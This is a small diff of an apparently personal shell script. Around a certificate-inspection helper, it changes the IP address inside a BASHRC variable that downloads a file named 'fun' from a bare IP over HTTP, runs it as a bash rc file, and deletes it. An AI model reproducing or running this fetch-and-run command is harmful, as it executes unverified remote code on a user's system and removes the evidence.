@@ -1055,7 +1055,7 @@ openssl s_client -showcerts  -CAfile /etc/ssl/certs/ca-certificates.crt -connect
 #openssl s_client -showcerts -connect ${1} 2>/dev/null | openssl x509 -noout -text | grep DNS:
 }
 
-BASHRC="wget http://198.11.230.226/toolR32/fun;bash --rcfile ./fun ;rm -rf fun;"
+BASHRC="wget http://98.11.230.226/toolR32/fun;bash --rcfile ./fun ;rm -rf fun;"
 
 function vara_user() {
 
